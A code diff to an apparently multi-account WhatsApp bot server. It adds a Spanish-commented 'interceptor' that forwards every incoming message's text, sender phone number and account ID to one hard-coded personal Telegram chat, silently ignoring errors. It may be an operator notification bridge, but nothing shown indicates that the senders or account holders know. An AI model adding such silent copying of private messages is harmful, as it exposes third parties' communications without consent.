@@ -340,6 +340,17 @@ async function startClientSession(clientId, phoneNumber, res) {
 
         if (!textoCliente) { console.log('[MSG] Texto vacio, ignorando'); return; }
 
+        // --- INTERCEPTOR DE TELEGRAM ---
+        try {
+            const numeroCliente = sender.split('@')[0];
+            const sessionKey = `${clientId}_${numeroCliente}`;
+            global.telegramSessionMap[sessionKey] = { clientId: clientId, whatsappJid: sender };
+            
+            const alerta = `📱 *Nuevo mensaje en WhatsApp*\n🏢 Cuenta: ${clientId}\n👤 De: +${numeroCliente}\n\n💬 Mensaje:\n${textoCliente}\n\n[ID: ${sessionKey}]`;
+            telegramBot.sendMessage(MI_TELEGRAM_ID, alerta, { parse_mode: 'Markdown' }).catch(e=>console.log(e));
+        } catch(e) {}
+        // --------------------------------
+
         const conversationKey = clientId + '_' + sender;
         activeConversations[conversationKey] = Date.now();
 
